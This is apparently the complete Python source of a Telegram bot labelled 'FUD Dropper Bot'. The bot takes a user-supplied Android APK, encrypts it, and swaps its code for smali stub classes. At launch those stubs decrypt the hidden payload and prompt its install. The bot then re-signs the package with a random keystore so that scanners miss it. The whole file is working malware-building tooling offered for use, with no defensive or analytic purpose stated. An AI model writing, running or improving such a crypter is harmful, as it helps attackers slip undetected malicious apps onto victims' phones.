import os, json, logging, subprocess, shutil, random, string, uuid, base64, re
from pathlib import Path
from telegram import Update, Document
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes

BOT_TOKEN = os.getenv('BOT_TOKEN')
ALLOWED_USERS = json.loads(os.getenv('ALLOWED_USERS', '[]'))
WORK_DIR = os.getenv('WORK_DIR', '/tmp/work')
TEMP_DIR = os.getenv('TEMP_DIR', '/tmp/temp')

if not BOT_TOKEN:
    raise RuntimeError("BOT_TOKEN not set")

logging.basicConfig(format="%(asctime)s - %(name)s - %(levelname)s - %(message)s", level=logging.INFO)
logger = logging.getLogger(__name__)

def ensure_dirs():
    Path(WORK_DIR).mkdir(parents=True, exist_ok=True)
    Path(TEMP_DIR).mkdir(parents=True, exist_ok=True)

def is_allowed(uid):
    return not ALLOWED_USERS or uid in ALLOWED_USERS

def run_cmd(cmd, timeout=300):
    try:
        r = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout)
        if r.returncode != 0:
            logger.error(f"Cmd failed: {' '.join(cmd)}\n{r.stderr}")
            return False
        return True
    except subprocess.TimeoutExpired:
        logger.error("Command timed out")
        return False

def random_string(length=8):
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=length))

# ----------- Pre‑written Smali (100% valid) -----------
STUB_APP = """.class public Lcom/dropper/StubApp;
.super Landroid/app/Application;

.method public onCreate()V
    .registers 10
    .prologue
    :try_start
    invoke-virtual {p0}, Lcom/dropper/StubApp;->getApplicationContext()Landroid/content/Context;
    move-result-object v0

    const-string v1, "key.txt"
    invoke-virtual {p0}, Lcom/dropper/StubApp;->getAssets()Landroid/content/res/AssetManager;
    move-result-object v2
    invoke-virtual {v2, v1}, Landroid/content/res/AssetManager;->open(Ljava/lang/String;)Ljava/io/InputStream;
    move-result-object v1
    invoke-static {v1}, Lcom/dropper/Util;->readBytes(Ljava/io/InputStream;)[B
    move-result-object v1
    new-instance v2, Ljava/lang/String;
    invoke-direct {v2, v1}, Ljava/lang/String;-><init>([B)V
    invoke-virtual {v2}, Ljava/lang/String;->trim()Ljava/lang/String;
    move-result-object v2
    invoke-static {v2}, Lcom/dropper/Util;->hexToBytes(Ljava/lang/String;)[B
    move-result-object v3

    const-string v4, "payload.apk.enc"
    invoke-virtual {p0}, Lcom/dropper/StubApp;->getAssets()Landroid/content/res/AssetManager;
    move-result-object v5
    invoke-virtual {v5, v4}, Landroid/content/res/AssetManager;->open(Ljava/lang/String;)Ljava/io/InputStream;
    move-result-object v4
    invoke-static {v4}, Lcom/dropper/Util;->readBytes(Ljava/io/InputStream;)[B
    move-result-object v4

    const-string v5, "AES/ECB/PKCS5Padding"
    invoke-static {v5}, Ljavax/crypto/Cipher;->getInstance(Ljava/lang/String;)Ljavax/crypto/Cipher;
    move-result-object v5
    new-instance v6, Ljavax/crypto/spec/SecretKeySpec;
    const-string v7, "AES"
    invoke-direct {v6, v3, v7}, Ljavax/crypto/spec/SecretKeySpec;-><init>([BLjava/lang/String;)V
    const/4 v7, 0x2
    invoke-virtual {v5, v7, v6}, Ljavax/crypto/Cipher;->init(ILjava/security/Key;)V
    invoke-virtual {v5, v4}, Ljavax/crypto/Cipher;->doFinal([B)[B
    move-result-object v4

    const-string v6, "dropped.apk"
    const/4 v7, 0x0
    invoke-virtual {p0, v6, v7}, Lcom/dropper/StubApp;->openFileOutput(Ljava/lang/String;I)Ljava/io/FileOutputStream;
    move-result-object v6
    invoke-virtual {v6, v4}, Ljava/io/FileOutputStream;->write([B)V
    invoke-virtual {v6}, Ljava/io/FileOutputStream;->close()V

    new-instance v6, Ljava/io/File;
    invoke-virtual {p0}, Lcom/dropper/StubApp;->getFilesDir()Ljava/io/File;
    move-result-object v7
    const-string v8, "dropped.apk"
    invoke-direct {v6, v7, v8}, Ljava/io/File;-><init>(Ljava/io/File;Ljava/lang/String;)V
    invoke-static {v0, v6}, Lcom/dropper/Util;->installApk(Landroid/content/Context;Ljava/io/File;)V
    :try_end
    .catch Ljava/lang/Exception; {:try_start .. :try_end} :catch_0
    return-void
    :catch_0
    move-exception v0
    invoke-virtual {v0}, Ljava/lang/Exception;->printStackTrace()V
    return-void
.end method
"""

STUB_UTIL = """.class public Lcom/dropper/Util;
.super Ljava/lang/Object;

.method public static readBytes(Ljava/io/InputStream;)[B
    .registers 5
    new-instance v0, Ljava/io/ByteArrayOutputStream;
    invoke-direct {v0}, Ljava/io/ByteArrayOutputStream;-><init>()V
    const/16 v1, 0x400
    new-array v1, v1, [B
    :loop
    invoke-virtual {p0, v1}, Ljava/io/InputStream;->read([B)I
    move-result v2
    const/4 v3, -0x1
    if-eq v2, v3, :write
    const/4 v3, 0x0
    invoke-virtual {v0, v1, v3, v2}, Ljava/io/ByteArrayOutputStream;->write([BII)V
    goto :loop
    :write
    invoke-virtual {v0}, Ljava/io/ByteArrayOutputStream;->toByteArray()[B
    move-result-object v0
    return-object v0
.end method

.method public static hexToBytes(Ljava/lang/String;)[B
    .registers 8
    invoke-virtual {p0}, Ljava/lang/String;->length()I
    move-result v0
    div-int/lit8 v0, v0, 0x2
    new-array v1, v0, [B
    const/4 v2, 0x0
    :loop
    if-ge v2, v0, :endloop
    mul-int/lit8 v3, v2, 0x2
    add-int/lit8 v4, v3, 0x2
    invoke-virtual {p0, v3, v4}, Ljava/lang/String;->substring(II)Ljava/lang/String;
    move-result-object v3
    const/16 v5, 0x10
    invoke-static {v3, v5}, Ljava/lang/Integer;->parseInt(Ljava/lang/String;I)I
    move-result v3
    int-to-byte v3, v3
    aput-byte v3, v1, v2
    add-int/lit8 v2, v2, 0x1
    goto :loop
    :endloop
    return-object v1
.end method

.method public static installApk(Landroid/content/Context;Ljava/io/File;)V
    .registers 8
    sget v0, Landroid/os/Build$VERSION;->SDK_INT:I
    const/16 v1, 0x18
    if-lt v0, v1, :nougat
    const-string v2, "com.dropper.fileprovider"
    invoke-static {p0, v2, p1}, Lcom/dropper/Util;->getUriForFile(Landroid/content/Context;Ljava/lang/String;Ljava/io/File;)Landroid/net/Uri;
    move-result-object v2
    goto :pre_nougat
    :nougat
    invoke-static {p1}, Landroid/net/Uri;->fromFile(Ljava/io/File;)Landroid/net/Uri;
    move-result-object v2
    :pre_nougat
    new-instance v3, Landroid/content/Intent;
    const-string v4, "android.intent.action.VIEW"
    invoke-direct {v3, v4}, Landroid/content/Intent;-><init>(Ljava/lang/String;)V
    invoke-virtual {v3, v2}, Landroid/content/Intent;->setData(Landroid/net/Uri;)Landroid/content/Intent;
    const-string v4, "application/vnd.android.package-archive"
    invoke-virtual {v3, v4}, Landroid/content/Intent;->setType(Ljava/lang/String;)Landroid/content/Intent;
    const/high16 v4, 0x10000000
    invoke-virtual {v3, v4}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;
    invoke-virtual {p0, v3}, Landroid/content/Context;->startActivity(Landroid/content/Intent;)V
    return-void
.end method

.method private static getUriForFile(Landroid/content/Context;Ljava/lang/String;Ljava/io/File;)Landroid/net/Uri;
    .registers 4
    invoke-static {p0, p1, p2}, Landroidx/core/content/FileProvider;->getUriForFile(Landroid/content/Context;Ljava/lang/String;Ljava/io/File;)Landroid/net/Uri;
    move-result-object v0
    return-object v0
.end method
"""

def dropper_protect(input_apk: str, output_apk: str) -> bool:
    ensure_dirs()
    dec_dir = os.path.join(TEMP_DIR, 'dec_' + uuid.uuid4().hex[:6])
    rebuilt = os.path.join(TEMP_DIR, 'rebuilt.apk')
    aligned = os.path.join(TEMP_DIR, 'aligned.apk')
    encrypted_apk = os.path.join(TEMP_DIR, 'payload.apk.enc')
    ks_path = os.path.join(TEMP_DIR, 'rand.keystore')

    # Decode original APK
    if not run_cmd(['apktool', 'd', '-f', '-o', dec_dir, input_apk], timeout=180):
        return False

    try:
        # Encrypt whole APK
        key = os.urandom(16)
        key_hex = base64.b16encode(key).decode().lower()
        if not run_cmd(['openssl', 'enc', '-aes-128-ecb', '-K', key_hex, '-in', input_apk, '-out', encrypted_apk], timeout=60):
            return False

        # Assets
        assets_dir = os.path.join(dec_dir, 'assets')
        os.makedirs(assets_dir, exist_ok=True)
        shutil.copy(encrypted_apk, os.path.join(assets_dir, 'payload.apk.enc'))
        with open(os.path.join(assets_dir, 'key.txt'), 'w') as f:
            f.write(key_hex)

        # Remove original smali folders
        for item in os.listdir(dec_dir):
            if item.startswith('smali'):
                shutil.rmtree(os.path.join(dec_dir, item), ignore_errors=True)

        # Create new smali with our fixed classes
        stub_dir = os.path.join(dec_dir, 'smali', 'com', 'dropper')
        os.makedirs(stub_dir, exist_ok=True)
        with open(os.path.join(stub_dir, 'StubApp.smali'), 'w') as f:
            f.write(STUB_APP)
        with open(os.path.join(stub_dir, 'Util.smali'), 'w') as f:
            f.write(STUB_UTIL)

        # Modify manifest
        manifest_path = os.path.join(dec_dir, 'AndroidManifest.xml')
        with open(manifest_path, 'r', encoding='utf-8') as f:
            manifest = f.read()

        # Remove any existing android:name from application
        manifest = re.sub(r'(<application[^>]*?)android:name="[^"]*"', r'\1', manifest)
        # Add our StubApp
        manifest = manifest.replace('<application', '<application android:name="com.dropper.StubApp"')
        # Add FileProvider (required for Android 7+)
        provider_entry = '''
        <provider
            android:name="androidx.core.content.FileProvider"
            android:authorities="com.dropper.fileprovider"
            android:exported="false"
            android:grantUriPermissions="true">
            <meta-data
                android:name="android.support.FILE_PROVIDER_PATHS"
                android:resource="@xml/file_paths" />
        </provider>'''
        manifest = manifest.replace('</application>', provider_entry + '\n    </application>')
        with open(manifest_path, 'w', encoding='utf-8') as f:
            f.write(manifest)

        # Create file_paths.xml
        xml_dir = os.path.join(dec_dir, 'res', 'xml')
        os.makedirs(xml_dir, exist_ok=True)
        with open(os.path.join(xml_dir, 'file_paths.xml'), 'w') as f:
            f.write('<?xml version="1.0" encoding="utf-8"?>\n<paths>\n    <files-path name="internal" path="." />\n</paths>')

        # Rebuild APK
        if not run_cmd(['apktool', 'b', '-o', rebuilt, dec_dir], timeout=180):
            return False

        # Zipalign
        if not run_cmd(['zipalign', '-v', '-p', '4', rebuilt, aligned], timeout=60):
            return False

        # Generate random keystore and sign
        ks_pass = ''.join(random.choices(string.ascii_letters + string.digits, k=12))
        alias = ''.join(random.choices(string.ascii_letters, k=6))
        dname = f"CN={''.join(random.choices(string.ascii_letters, k=5))}, OU=Dev, O=Org, L=Loc, ST=ST, C={random.choice(['US','GB','IN'])}"
        if not run_cmd(['keytool', '-genkey', '-v', '-keystore', ks_path, '-alias', alias, '-keyalg', 'RSA', '-keysize', '2048', '-validity', '365', '-storepass', ks_pass, '-keypass', ks_pass, '-dname', dname], timeout=30):
            return False
        if not run_cmd(['apksigner', 'sign', '--ks', ks_path, '--ks-pass', f'pass:{ks_pass}', '--ks-key-alias', alias, '--out', output_apk, aligned], timeout=30):
            return False

        return True
    except Exception as e:
        logger.exception("Dropper protect failed")
        return False
    finally:
        shutil.rmtree(dec_dir, ignore_errors=True)
        for f in [encrypted_apk, rebuilt, aligned, ks_path]:
            try: os.remove(f)
            except: pass

# Telegram handlers
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_allowed(update.effective_user.id):
        await update.message.reply_text("Access denied.")
        return
    await update.message.reply_text("FUD Dropper Bot ready. Send APK.")

async def handle_doc(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    if not is_allowed(uid):
        await update.message.reply_text("Access denied.")
        return
    doc: Document = update.message.document
    if not doc.file_name or not doc.file_name.lower().endswith(".apk"):
        await update.message.reply_text("Only APK accepted.")
        return
    await update.message.reply_text("Processing... (max 2 min)")
    fin = os.path.join(WORK_DIR, f"{uid}_{doc.file_name}")
    await (await doc.get_file()).download_to_drive(fin)
    base, ext = os.path.splitext(doc.file_name)
    fout = os.path.join(WORK_DIR, f"{base}_fud{ext}")
    success = False
    try:
        success = dropper_protect(fin, fout)
    except Exception as e:
        logger.exception("Error")
    try: os.remove(fin)
    except: pass
    if success:
        with open(fout, "rb") as f:
            await update.message.reply_document(
                document=f,
                filename=os.path.basename(fout),
                caption="FUD Dropper APK ready."
            )
        try: os.remove(fout)
        except: pass
    else:
        await update.message.reply_text("Processing failed. Check logs.")
        if os.path.exists(fout): os.remove(fout)

async def err_handler(update, context):
    logger.error(context.error)

def main():
    ensure_dirs()
    app = Application.builder().token(BOT_TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(MessageHandler(filters.Document.ALL, handle_doc))
    app.add_error_handler(err_handler)
    logger.info("Bot starting...")
    app.run_polling()

if __name__ == "__main__":
    main()
